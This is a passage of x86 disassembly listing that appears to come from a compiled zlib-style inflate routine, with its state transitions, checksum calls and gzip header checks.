  4072b9:	c7 01 1d 00 00 00    	movl   $0x1d,(%ecx)
  4072bf:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4072c4:	e9 40 ea ff ff       	jmp    0x405d09
  4072c9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
  4072d0:	d3 ee                	shr    %cl,%esi
  4072d2:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  4072d6:	8b 6c 24 24          	mov    0x24(%esp),%ebp
  4072da:	29 c3                	sub    %eax,%ebx
  4072dc:	89 c8                	mov    %ecx,%eax
  4072de:	83 c0 01             	add    $0x1,%eax
  4072e1:	89 45 68             	mov    %eax,0x68(%ebp)
  4072e4:	89 44 24 48          	mov    %eax,0x48(%esp)
  4072e8:	66 89 54 4d 70       	mov    %dx,0x70(%ebp,%ecx,2)
  4072ed:	e9 74 f2 ff ff       	jmp    0x406566
  4072f2:	8b 44 24 24          	mov    0x24(%esp),%eax
  4072f6:	c7 00 10 00 00 00    	movl   $0x10,(%eax)
  4072fc:	b8 10 00 00 00       	mov    $0x10,%eax
  407301:	e9 37 eb ff ff       	jmp    0x405e3d
  407306:	8d 76 00             	lea    0x0(%esi),%esi
  407309:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407310:	89 dd                	mov    %ebx,%ebp
  407312:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  407316:	89 fb                	mov    %edi,%ebx
  407318:	89 ce                	mov    %ecx,%esi
  40731a:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40731e:	e9 2d f0 ff ff       	jmp    0x406350
  407323:	89 5c 24 3c          	mov    %ebx,0x3c(%esp)
  407327:	8b 7c 24 24          	mov    0x24(%esp),%edi
  40732b:	89 eb                	mov    %ebp,%ebx
  40732d:	89 f5                	mov    %esi,%ebp
  40732f:	89 ce                	mov    %ecx,%esi
  407331:	e9 1a f0 ff ff       	jmp    0x406350
  407336:	8d 76 00             	lea    0x0(%esi),%esi
  407339:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407340:	89 54 24 08          	mov    %edx,0x8(%esp)
  407344:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  407348:	8b 40 18             	mov    0x18(%eax),%eax
  40734b:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  40734f:	89 04 24             	mov    %eax,(%esp)
  407352:	e8 69 13 00 00       	call   0x4086c0
  407357:	8b 54 24 24          	mov    0x24(%esp),%edx
  40735b:	89 42 18             	mov    %eax,0x18(%edx)
  40735e:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  407362:	e9 d2 f8 ff ff       	jmp    0x406c39
  407367:	89 f6                	mov    %esi,%esi
  407369:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
  407370:	89 c2                	mov    %eax,%edx
  407372:	89 c1                	mov    %eax,%ecx
  407374:	29 c3                	sub    %eax,%ebx
  407376:	0f b7 44 24 54       	movzwl 0x54(%esp),%eax
  40737b:	d3 ee                	shr    %cl,%esi
  40737d:	80 7c 24 3c 00       	cmpb   $0x0,0x3c(%esp)
  407382:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407386:	89 91 c4 1b 00 00    	mov    %edx,0x1bc4(%ecx)
  40738c:	89 41 40             	mov    %eax,0x40(%ecx)
  40738f:	0f 85 8e 00 00 00    	jne    0x407423
  407395:	c7 01 19 00 00 00    	movl   $0x19,(%ecx)
  40739b:	b8 19 00 00 00       	mov    $0x19,%eax
  4073a0:	e9 64 e9 ff ff       	jmp    0x405d09
  4073a5:	89 54 24 08          	mov    %edx,0x8(%esp)
  4073a9:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4073ad:	8b 40 18             	mov    0x18(%eax),%eax
  4073b0:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  4073b4:	89 04 24             	mov    %eax,(%esp)
  4073b7:	e8 04 13 00 00       	call   0x4086c0
  4073bc:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4073c0:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  4073c4:	89 41 18             	mov    %eax,0x18(%ecx)
  4073c7:	e9 5d f6 ff ff       	jmp    0x406a29
  4073cc:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4073d3:	c7 40 18 24 d6 40 00 	movl   $0x40d624,0x18(%eax)
  4073da:	8b 44 24 24          	mov    0x24(%esp),%eax
  4073de:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4073e4:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4073e9:	e9 1b e9 ff ff       	jmp    0x405d09
  4073ee:	66 90                	xchg   %ax,%ax
  4073f0:	8b 54 24 24          	mov    0x24(%esp),%edx
  4073f4:	29 c8                	sub    %ecx,%eax
  4073f6:	03 42 34             	add    0x34(%edx),%eax
  4073f9:	89 44 24 40          	mov    %eax,0x40(%esp)
  4073fd:	e9 41 eb ff ff       	jmp    0x405f43
  407402:	0f b7 44 24 54       	movzwl 0x54(%esp),%eax
  407407:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  40740b:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40740f:	83 e2 0f             	and    $0xf,%edx
  407412:	89 41 44             	mov    %eax,0x44(%ecx)
  407415:	89 51 48             	mov    %edx,0x48(%ecx)
  407418:	c7 01 17 00 00 00    	movl   $0x17,(%ecx)
  40741e:	e9 64 ea ff ff       	jmp    0x405e87
  407423:	f6 44 24 3c 20       	testb  $0x20,0x3c(%esp)
  407428:	0f 84 7e 01 00 00    	je     0x4075ac
  40742e:	8b 44 24 24          	mov    0x24(%esp),%eax
  407432:	c7 80 c4 1b 00 00 ff 	movl   $0xffffffff,0x1bc4(%eax)
  407439:	ff ff ff 
  40743c:	c7 00 0b 00 00 00    	movl   $0xb,(%eax)
  407442:	b8 0b 00 00 00       	mov    $0xb,%eax
  407447:	e9 bd e8 ff ff       	jmp    0x405d09
  40744c:	c7 07 1e 00 00 00    	movl   $0x1e,(%edi)
  407452:	b8 fc ff ff ff       	mov    $0xfffffffc,%eax
  407457:	e9 c9 ee ff ff       	jmp    0x406325
  40745c:	89 f0                	mov    %esi,%eax
  40745e:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  407462:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  407469:	00 
  40746a:	88 44 24 6c          	mov    %al,0x6c(%esp)
  40746e:	89 f0                	mov    %esi,%eax
  407470:	c1 e8 08             	shr    $0x8,%eax
  407473:	88 44 24 6d          	mov    %al,0x6d(%esp)
  407477:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  40747b:	89 44 24 04          	mov    %eax,0x4(%esp)
  40747f:	8b 43 18             	mov    0x18(%ebx),%eax
  407482:	89 04 24             	mov    %eax,(%esp)
  407485:	e8 36 12 00 00       	call   0x4086c0
  40748a:	8b 53 10             	mov    0x10(%ebx),%edx
  40748d:	89 43 18             	mov    %eax,0x18(%ebx)
  407490:	e9 44 f6 ff ff       	jmp    0x406ad9
  407495:	89 d8                	mov    %ebx,%eax
  407497:	89 7c 24 3c          	mov    %edi,0x3c(%esp)
  40749b:	89 eb                	mov    %ebp,%ebx
  40749d:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4074a1:	89 f5                	mov    %esi,%ebp
  4074a3:	89 c6                	mov    %eax,%esi
  4074a5:	e9 a6 ee ff ff       	jmp    0x406350
  4074aa:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4074b1:	c7 40 18 80 d5 40 00 	movl   $0x40d580,0x18(%eax)
  4074b8:	8b 44 24 24          	mov    0x24(%esp),%eax
  4074bc:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4074c2:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4074c7:	e9 3d e8 ff ff       	jmp    0x405d09
  4074cc:	83 bc 24 94 00 00 00 	cmpl   $0x6,0x94(%esp)
  4074d3:	06 
  4074d4:	8b 44 24 24          	mov    0x24(%esp),%eax
  4074d8:	c7 40 4c 80 d8 40 00 	movl   $0x40d880,0x4c(%eax)
  4074df:	c7 40 54 09 00 00 00 	movl   $0x9,0x54(%eax)
  4074e6:	c7 40 50 00 d8 40 00 	movl   $0x40d800,0x50(%eax)
  4074ed:	c7 40 58 05 00 00 00 	movl   $0x5,0x58(%eax)
  4074f4:	c7 00 13 00 00 00    	movl   $0x13,(%eax)
  4074fa:	0f 84 9f 05 00 00    	je     0x407a9f
  407500:	b8 13 00 00 00       	mov    $0x13,%eax
  407505:	e9 33 e9 ff ff       	jmp    0x405e3d
  40750a:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407511:	c7 40 18 f3 d5 40 00 	movl   $0x40d5f3,0x18(%eax)
  407518:	8b 44 24 24          	mov    0x24(%esp),%eax
  40751c:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407522:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407527:	e9 11 e9 ff ff       	jmp    0x405e3d
  40752c:	8b 44 24 40          	mov    0x40(%esp),%eax
  407530:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  407534:	89 44 24 08          	mov    %eax,0x8(%esp)
  407538:	8b 44 24 24          	mov    0x24(%esp),%eax
  40753c:	8b 40 18             	mov    0x18(%eax),%eax
  40753f:	89 04 24             	mov    %eax,(%esp)
  407542:	e8 79 11 00 00       	call   0x4086c0
  407547:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40754b:	89 41 18             	mov    %eax,0x18(%ecx)
  40754e:	e9 ec f3 ff ff       	jmp    0x40693f
  407553:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  407557:	89 de                	mov    %ebx,%esi
  407559:	89 eb                	mov    %ebp,%ebx
  40755b:	89 fd                	mov    %edi,%ebp
  40755d:	89 c7                	mov    %eax,%edi
  40755f:	e9 ec ed ff ff       	jmp    0x406350
  407564:	89 f0                	mov    %esi,%eax
  407566:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40756a:	c7 44 24 08 04 00 00 	movl   $0x4,0x8(%esp)
  407571:	00 
  407572:	88 44 24 6c          	mov    %al,0x6c(%esp)
  407576:	89 f0                	mov    %esi,%eax
  407578:	c1 e8 08             	shr    $0x8,%eax
  40757b:	88 44 24 6d          	mov    %al,0x6d(%esp)
  40757f:	89 f0                	mov    %esi,%eax
  407581:	c1 e8 10             	shr    $0x10,%eax
  407584:	88 44 24 6e          	mov    %al,0x6e(%esp)
  407588:	89 f0                	mov    %esi,%eax
  40758a:	c1 e8 18             	shr    $0x18,%eax
  40758d:	88 44 24 6f          	mov    %al,0x6f(%esp)
  407591:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  407595:	89 44 24 04          	mov    %eax,0x4(%esp)
  407599:	8b 43 18             	mov    0x18(%ebx),%eax
  40759c:	89 04 24             	mov    %eax,(%esp)
  40759f:	e8 1c 11 00 00       	call   0x4086c0
  4075a4:	89 43 18             	mov    %eax,0x18(%ebx)
  4075a7:	e9 21 ef ff ff       	jmp    0x4064cd
  4075ac:	f6 44 24 3c 40       	testb  $0x40,0x3c(%esp)
  4075b1:	0f 84 c5 01 00 00    	je     0x40777c
  4075b7:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  4075be:	c7 40 18 d3 d6 40 00 	movl   $0x40d6d3,0x18(%eax)
  4075c5:	8b 44 24 24          	mov    0x24(%esp),%eax
  4075c9:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  4075cf:	b8 1d 00 00 00       	mov    $0x1d,%eax
  4075d4:	e9 30 e7 ff ff       	jmp    0x405d09
  4075d9:	83 bc 24 94 00 00 00 	cmpl   $0x6,0x94(%esp)
  4075e0:	06 
  4075e1:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  4075e5:	89 43 40             	mov    %eax,0x40(%ebx)
  4075e8:	c7 03 0e 00 00 00    	movl   $0xe,(%ebx)
  4075ee:	0f 84 94 04 00 00    	je     0x407a88
  4075f4:	31 db                	xor    %ebx,%ebx
  4075f6:	31 f6                	xor    %esi,%esi
  4075f8:	e9 ea ee ff ff       	jmp    0x4064e7
  4075fd:	f7 c6 00 e0 00 00    	test   $0xe000,%esi
  407603:	0f 84 8c 01 00 00    	je     0x407795
  407609:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407610:	c7 40 18 c6 d5 40 00 	movl   $0x40d5c6,0x18(%eax)
  407617:	8b 44 24 24          	mov    0x24(%esp),%eax
  40761b:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407621:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407626:	e9 de e6 ff ff       	jmp    0x405d09
  40762b:	89 f0                	mov    %esi,%eax
  40762d:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  407631:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  407638:	00 
  407639:	88 44 24 6c          	mov    %al,0x6c(%esp)
  40763d:	89 f0                	mov    %esi,%eax
  40763f:	31 f6                	xor    %esi,%esi
  407641:	c1 e8 08             	shr    $0x8,%eax
  407644:	88 44 24 6d          	mov    %al,0x6d(%esp)
  407648:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  40764c:	89 44 24 04          	mov    %eax,0x4(%esp)
  407650:	8b 43 18             	mov    0x18(%ebx),%eax
  407653:	89 04 24             	mov    %eax,(%esp)
  407656:	e8 65 10 00 00       	call   0x4086c0
  40765b:	89 da                	mov    %ebx,%edx
  40765d:	89 43 18             	mov    %eax,0x18(%ebx)
  407660:	31 db                	xor    %ebx,%ebx
  407662:	8b 52 10             	mov    0x10(%edx),%edx
  407665:	e9 a3 ec ff ff       	jmp    0x40630d
  40766a:	8d 50 02             	lea    0x2(%eax),%edx
  40766d:	39 d3                	cmp    %edx,%ebx
  40766f:	73 35                	jae    0x4076a6
  407671:	85 ff                	test   %edi,%edi
  407673:	74 7a                	je     0x4076ef
  407675:	89 d9                	mov    %ebx,%ecx
  407677:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  40767b:	89 c3                	mov    %eax,%ebx
  40767d:	89 d0                	mov    %edx,%eax
  40767f:	eb 08                	jmp    0x407689
  407681:	85 ff                	test   %edi,%edi
  407683:	0f 84 47 f9 ff ff    	je     0x406fd0
  407689:	83 c5 01             	add    $0x1,%ebp
  40768c:	0f b6 55 ff          	movzbl -0x1(%ebp),%edx
  407690:	83 ef 01             	sub    $0x1,%edi
  407693:	d3 e2                	shl    %cl,%edx
  407695:	83 c1 08             	add    $0x8,%ecx
  407698:	01 d6                	add    %edx,%esi
  40769a:	39 c1                	cmp    %eax,%ecx
  40769c:	72 e3                	jb     0x407681
  40769e:	89 d8                	mov    %ebx,%eax
  4076a0:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  4076a4:	89 cb                	mov    %ecx,%ebx
  4076a6:	89 c1                	mov    %eax,%ecx
  4076a8:	29 c3                	sub    %eax,%ebx
  4076aa:	8b 44 24 48          	mov    0x48(%esp),%eax
  4076ae:	d3 ee                	shr    %cl,%esi
  4076b0:	85 c0                	test   %eax,%eax
  4076b2:	0f 84 aa 03 00 00    	je     0x407a62
  4076b8:	8b 44 24 24          	mov    0x24(%esp),%eax
  4076bc:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  4076c0:	83 eb 02             	sub    $0x2,%ebx
  4076c3:	0f b7 54 48 6e       	movzwl 0x6e(%eax,%ecx,2),%edx
  4076c8:	89 f1                	mov    %esi,%ecx
  4076ca:	c1 ee 02             	shr    $0x2,%esi
  4076cd:	83 e1 03             	and    $0x3,%ecx
  4076d0:	8d 41 03             	lea    0x3(%ecx),%eax
  4076d3:	89 c1                	mov    %eax,%ecx
  4076d5:	e9 a7 ef ff ff       	jmp    0x406681
  4076da:	66 89 4c 24 54       	mov    %cx,0x54(%esp)
  4076df:	0f b6 4c 24 48       	movzbl 0x48(%esp),%ecx
  4076e4:	2b 5c 24 44          	sub    0x44(%esp),%ebx
  4076e8:	d3 ee                	shr    %cl,%esi
  4076ea:	e9 83 fc ff ff       	jmp    0x407372
  4076ef:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  4076f3:	89 fd                	mov    %edi,%ebp
  4076f5:	89 de                	mov    %ebx,%esi
  4076f7:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4076fb:	8b 5c 24 44          	mov    0x44(%esp),%ebx
  4076ff:	e9 4c ec ff ff       	jmp    0x406350
  407704:	8b 5c 24 3c          	mov    0x3c(%esp),%ebx
  407708:	89 fd                	mov    %edi,%ebp
  40770a:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  40770e:	8b 7c 24 24          	mov    0x24(%esp),%edi
  407712:	89 ce                	mov    %ecx,%esi
  407714:	e9 37 ec ff ff       	jmp    0x406350
  407719:	8d 48 03             	lea    0x3(%eax),%ecx
  40771c:	39 cb                	cmp    %ecx,%ebx
  40771e:	89 ca                	mov    %ecx,%edx
  407720:	73 35                	jae    0x407757
  407722:	85 ff                	test   %edi,%edi
  407724:	74 c9                	je     0x4076ef
  407726:	89 d9                	mov    %ebx,%ecx
  407728:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  40772c:	89 c3                	mov    %eax,%ebx
  40772e:	89 d0                	mov    %edx,%eax
  407730:	eb 08                	jmp    0x40773a
  407732:	85 ff                	test   %edi,%edi
  407734:	0f 84 96 f8 ff ff    	je     0x406fd0
  40773a:	83 c5 01             	add    $0x1,%ebp
  40773d:	0f b6 55 ff          	movzbl -0x1(%ebp),%edx
  407741:	83 ef 01             	sub    $0x1,%edi
  407744:	d3 e2                	shl    %cl,%edx
  407746:	83 c1 08             	add    $0x8,%ecx
  407749:	01 d6                	add    %edx,%esi
  40774b:	39 c1                	cmp    %eax,%ecx
  40774d:	72 e3                	jb     0x407732
  40774f:	89 d8                	mov    %ebx,%eax
  407751:	89 6c 24 44          	mov    %ebp,0x44(%esp)
  407755:	89 cb                	mov    %ecx,%ebx
  407757:	89 c1                	mov    %eax,%ecx
  407759:	d3 ee                	shr    %cl,%esi
  40775b:	89 f1                	mov    %esi,%ecx
  40775d:	89 f2                	mov    %esi,%edx
  40775f:	83 e1 07             	and    $0x7,%ecx
  407762:	8d 71 03             	lea    0x3(%ecx),%esi
  407765:	89 f1                	mov    %esi,%ecx
  407767:	89 d6                	mov    %edx,%esi
  407769:	ba fd ff ff ff       	mov    $0xfffffffd,%edx
  40776e:	29 c2                	sub    %eax,%edx
  407770:	c1 ee 03             	shr    $0x3,%esi
  407773:	01 d3                	add    %edx,%ebx
  407775:	31 d2                	xor    %edx,%edx
  407777:	e9 05 ef ff ff       	jmp    0x406681
  40777c:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  407780:	8b 44 24 24          	mov    0x24(%esp),%eax
  407784:	83 e2 0f             	and    $0xf,%edx
  407787:	c7 00 15 00 00 00    	movl   $0x15,(%eax)
  40778d:	89 50 48             	mov    %edx,0x48(%eax)
  407790:	e9 85 e9 ff ff       	jmp    0x40611a
  407795:	8b 44 24 24          	mov    0x24(%esp),%eax
  407799:	8b 40 20             	mov    0x20(%eax),%eax
  40779c:	85 c0                	test   %eax,%eax
  40779e:	74 0a                	je     0x4077aa
  4077a0:	89 f2                	mov    %esi,%edx
  4077a2:	c1 ea 08             	shr    $0x8,%edx
  4077a5:	83 e2 01             	and    $0x1,%edx
  4077a8:	89 10                	mov    %edx,(%eax)
  4077aa:	f7 c6 00 02 00 00    	test   $0x200,%esi
  4077b0:	0f 85 e1 00 00 00    	jne    0x407897
  4077b6:	8b 44 24 24          	mov    0x24(%esp),%eax
  4077ba:	31 f6                	xor    %esi,%esi
  4077bc:	31 db                	xor    %ebx,%ebx
  4077be:	c7 00 02 00 00 00    	movl   $0x2,(%eax)
  4077c4:	e9 be ec ff ff       	jmp    0x406487
  4077c9:	29 c2                	sub    %eax,%edx
  4077cb:	8b 44 24 24          	mov    0x24(%esp),%eax
  4077cf:	89 54 24 04          	mov    %edx,0x4(%esp)
  4077d3:	8b 40 18             	mov    0x18(%eax),%eax
  4077d6:	89 04 24             	mov    %eax,(%esp)
  4077d9:	e8 92 09 00 00       	call   0x408170
  4077de:	e9 62 f7 ff ff       	jmp    0x406f45
  4077e3:	89 74 24 3c          	mov    %esi,0x3c(%esp)
  4077e7:	89 de                	mov    %ebx,%esi
  4077e9:	89 eb                	mov    %ebp,%ebx
  4077eb:	89 fd                	mov    %edi,%ebp
  4077ed:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4077f1:	c7 07 1c 00 00 00    	movl   $0x1c,(%edi)
  4077f7:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%esp)
  4077fe:	00 
  4077ff:	e9 4c eb ff ff       	jmp    0x406350
  407804:	8b 44 24 24          	mov    0x24(%esp),%eax
  407808:	c7 44 24 48 00 00 00 	movl   $0x0,0x48(%esp)
  40780f:	00 
  407810:	c7 40 68 00 00 00 00 	movl   $0x0,0x68(%eax)
  407817:	c7 00 12 00 00 00    	movl   $0x12,(%eax)
  40781d:	e9 2e ed ff ff       	jmp    0x406550
  407822:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  407826:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  40782a:	8b 01                	mov    (%ecx),%eax
  40782c:	83 f8 1d             	cmp    $0x1d,%eax
  40782f:	0f 84 d4 e4 ff ff    	je     0x405d09
  407835:	66 83 b9 70 02 00 00 	cmpw   $0x0,0x270(%ecx)
  40783c:	00 
  40783d:	89 c8                	mov    %ecx,%eax
  40783f:	0f 85 70 01 00 00    	jne    0x4079b5
  407845:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  40784c:	c7 41 18 7c d6 40 00 	movl   $0x40d67c,0x18(%ecx)
  407853:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407859:	b8 1d 00 00 00       	mov    $0x1d,%eax
  40785e:	e9 a6 e4 ff ff       	jmp    0x405d09
  407863:	89 f2                	mov    %esi,%edx
  407865:	8b 4c 24 30          	mov    0x30(%esp),%ecx
  407869:	89 de                	mov    %ebx,%esi
  40786b:	89 eb                	mov    %ebp,%ebx
  40786d:	89 fd                	mov    %edi,%ebp
  40786f:	89 c7                	mov    %eax,%edi
  407871:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407878:	89 48 0c             	mov    %ecx,0xc(%eax)
  40787b:	8b 4c 24 28          	mov    0x28(%esp),%ecx
  40787f:	89 18                	mov    %ebx,(%eax)
  407881:	89 68 04             	mov    %ebp,0x4(%eax)
  407884:	89 48 10             	mov    %ecx,0x10(%eax)
  407887:	89 57 38             	mov    %edx,0x38(%edi)
  40788a:	b8 02 00 00 00       	mov    $0x2,%eax
  40788f:	89 77 3c             	mov    %esi,0x3c(%edi)
  407892:	e9 8e ea ff ff       	jmp    0x406325
  407897:	89 f0                	mov    %esi,%eax
  407899:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40789d:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  4078a4:	00 
  4078a5:	88 44 24 6c          	mov    %al,0x6c(%esp)
  4078a9:	89 f0                	mov    %esi,%eax
  4078ab:	c1 e8 08             	shr    $0x8,%eax
  4078ae:	88 44 24 6d          	mov    %al,0x6d(%esp)
  4078b2:	8d 44 24 6c          	lea    0x6c(%esp),%eax
  4078b6:	89 44 24 04          	mov    %eax,0x4(%esp)
  4078ba:	8b 43 18             	mov    0x18(%ebx),%eax
  4078bd:	89 04 24             	mov    %eax,(%esp)
  4078c0:	e8 fb 0d 00 00       	call   0x4086c0
  4078c5:	89 43 18             	mov    %eax,0x18(%ebx)
  4078c8:	e9 e9 fe ff ff       	jmp    0x4077b6
  4078cd:	89 eb                	mov    %ebp,%ebx
  4078cf:	31 f6                	xor    %esi,%esi
  4078d1:	89 fd                	mov    %edi,%ebp
  4078d3:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%esp)
  4078da:	00 
  4078db:	8b 7c 24 24          	mov    0x24(%esp),%edi
  4078df:	e9 0d ff ff ff       	jmp    0x4077f1
  4078e4:	8b 44 24 24          	mov    0x24(%esp),%eax
  4078e8:	c1 ee 04             	shr    $0x4,%esi
  4078eb:	89 f1                	mov    %esi,%ecx
  4078ed:	83 e1 0f             	and    $0xf,%ecx
  4078f0:	8b 40 24             	mov    0x24(%eax),%eax
  4078f3:	83 c1 08             	add    $0x8,%ecx
  4078f6:	85 c0                	test   %eax,%eax
  4078f8:	0f 85 37 01 00 00    	jne    0x407a35
  4078fe:	8b 44 24 24          	mov    0x24(%esp),%eax
  407902:	89 48 24             	mov    %ecx,0x24(%eax)
  407905:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  407909:	b8 01 00 00 00       	mov    $0x1,%eax
  40790e:	81 e6 00 02 00 00    	and    $0x200,%esi
  407914:	d3 e0                	shl    %cl,%eax
  407916:	89 43 14             	mov    %eax,0x14(%ebx)
  407919:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  407920:	00 
  407921:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  407928:	00 
  407929:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  407930:	e8 3b 08 00 00       	call   0x408170
  407935:	8b 8c 24 90 00 00 00 	mov    0x90(%esp),%ecx
  40793c:	83 fe 01             	cmp    $0x1,%esi
  40793f:	89 43 18             	mov    %eax,0x18(%ebx)
  407942:	89 41 30             	mov    %eax,0x30(%ecx)
  407945:	19 c0                	sbb    %eax,%eax
  407947:	31 f6                	xor    %esi,%esi
  407949:	83 e0 02             	and    $0x2,%eax
  40794c:	83 c0 09             	add    $0x9,%eax
  40794f:	89 03                	mov    %eax,(%ebx)
  407951:	31 db                	xor    %ebx,%ebx
  407953:	e9 a8 e3 ff ff       	jmp    0x405d00
  407958:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  40795f:	00 
  407960:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  407967:	00 
  407968:	66 31 f6             	xor    %si,%si
  40796b:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
  407972:	e8 49 0d 00 00       	call   0x4086c0
  407977:	8b 5c 24 24          	mov    0x24(%esp),%ebx
  40797b:	8d 54 24 6c          	lea    0x6c(%esp),%edx
  40797f:	c6 44 24 6c 1f       	movb   $0x1f,0x6c(%esp)
  407984:	c6 44 24 6d 8b       	movb   $0x8b,0x6d(%esp)
  407989:	89 43 18             	mov    %eax,0x18(%ebx)
  40798c:	c7 44 24 08 02 00 00 	movl   $0x2,0x8(%esp)
  407993:	00 
  407994:	89 54 24 04          	mov    %edx,0x4(%esp)
  407998:	89 04 24             	mov    %eax,(%esp)
  40799b:	e8 20 0d 00 00       	call   0x4086c0
  4079a0:	c7 03 01 00 00 00    	movl   $0x1,(%ebx)
  4079a6:	89 43 18             	mov    %eax,0x18(%ebx)
  4079a9:	b8 01 00 00 00       	mov    $0x1,%eax
  4079ae:	31 db                	xor    %ebx,%ebx
  4079b0:	e9 54 e3 ff ff       	jmp    0x405d09
  4079b5:	8b 44 24 24          	mov    0x24(%esp),%eax
  4079b9:	8b 54 24 50          	mov    0x50(%esp),%edx
  4079bd:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  4079c1:	89 50 6c             	mov    %edx,0x6c(%eax)
  4079c4:	89 50 4c             	mov    %edx,0x4c(%eax)
  4079c7:	8d 50 6c             	lea    0x6c(%eax),%edx
  4079ca:	c7 40 54 09 00 00 00 	movl   $0x9,0x54(%eax)
  4079d1:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  4079d5:	89 c1                	mov    %eax,%ecx
  4079d7:	83 c0 54             	add    $0x54,%eax
  4079da:	89 54 24 0c          	mov    %edx,0xc(%esp)
  4079de:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
  4079e5:	89 44 24 10          	mov    %eax,0x10(%esp)
  4079e9:	8b 44 24 58          	mov    0x58(%esp),%eax
  4079ed:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  4079f1:	89 44 24 08          	mov    %eax,0x8(%esp)
  4079f5:	89 c8                	mov    %ecx,%eax
  4079f7:	83 c0 70             	add    $0x70,%eax
  4079fa:	89 44 24 04          	mov    %eax,0x4(%esp)
  4079fe:	e8 cd 0f 00 00       	call   0x4089d0
  407a03:	85 c0                	test   %eax,%eax
  407a05:	89 44 24 38          	mov    %eax,0x38(%esp)
  407a09:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  407a0d:	0f 84 a7 00 00 00    	je     0x407aba
  407a13:	8b 44 24 24          	mov    0x24(%esp),%eax
  407a17:	8b 94 24 90 00 00 00 	mov    0x90(%esp),%edx
  407a1e:	c7 42 18 a1 d6 40 00 	movl   $0x40d6a1,0x18(%edx)
  407a25:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407a2b:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407a30:	e9 d4 e2 ff ff       	jmp    0x405d09
  407a35:	39 c1                	cmp    %eax,%ecx
  407a37:	0f 86 c8 fe ff ff    	jbe    0x407905
  407a3d:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407a44:	83 eb 04             	sub    $0x4,%ebx
  407a47:	c7 40 18 b2 d5 40 00 	movl   $0x40d5b2,0x18(%eax)
  407a4e:	8b 44 24 24          	mov    0x24(%esp),%eax
  407a52:	c7 00 1d 00 00 00    	movl   $0x1d,(%eax)
  407a58:	b8 1d 00 00 00       	mov    $0x1d,%eax
  407a5d:	e9 a7 e2 ff ff       	jmp    0x405d09
  407a62:	8b 84 24 90 00 00 00 	mov    0x90(%esp),%eax
  407a69:	8b 6c 24 44          	mov    0x44(%esp),%ebp
  407a6d:	c7 40 18 61 d6 40 00 	movl   $0x40d661,0x18(%eax)
